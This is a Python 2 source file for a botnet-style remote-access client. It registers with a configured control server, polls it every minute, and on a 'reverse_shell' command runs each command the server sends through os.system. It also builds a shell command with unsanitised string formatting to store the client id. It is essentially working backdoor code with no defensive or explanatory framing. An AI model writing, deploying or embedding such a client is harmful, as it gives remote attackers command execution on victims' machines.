import json
import os
import datetime
from time import sleep
import socket
import hashlib
import socket
import sys

with open('client_config.json', 'r') as config_file:
    config = json.load(config_file)


def process_protocol(client_hashed_id, action):
	return '{"client_hashed_id":"%s", "action":"%s"}' % (client_hashed_id, action)

def processHandshake():

	def _register_as_client(client_hashed_id):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((config['srvhost'], int(config['srvport'])))
		s.send('{"client_hashed_id":"%s", "action":"%s"}' % (client_hashed_id, "register"))
		data = s.recv(1024)
		if data == "OK":
			os.system("echo -n '%s' >> client_hash_id.txt" % client_hashed_id)
			print("[S] Client id generated: %s" % client_hashed_id)
		else:
			print("[E] Error registering new client.")


	def _process_client_id():

		# Get the client id
		if os.path.exists('client_hash_id.txt'):
			with open('client_hash_id.txt', 'r') as client_hashed_id_file:
				client_hashed_id = client_hashed_id_file.read()
				client_hashed_id = client_hashed_id.rstrip()
				print("[i] Client already registered as %s" % client_hashed_id)
		else:
			print("[+] Registering as new client..")
			client_id_not_hashed = datetime.datetime.now()
			client_hashed_id = hashlib.md5(str(client_id_not_hashed)).hexdigest()
			_register_as_client(client_hashed_id)

		return client_hashed_id

	client_hashed_id = _process_client_id()
	return client_hashed_id


def checkForActions(client_hashed_id):
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((config['srvhost'], int(config['srvport'])))
		s.send(process_protocol(client_hashed_id, "checkAction"))
		action = s.recv(1024)
		if action:
			if action == "reverse_shell":
				print("[i] Called for initialize a reverse shell..")
				initializeReverseShell(s)
				s.close()
				continue
		sleep(60)


def initializeReverseShell(s):
	while True:
		cmd = s.recv(1024)
		if cmd:
			if cmd == "exit":
				break
			else:
				print("[i] Executing %s" % cmd)
				os.system(cmd)


def main():
	# Handshake with server
	checkForActions(processHandshake())

main()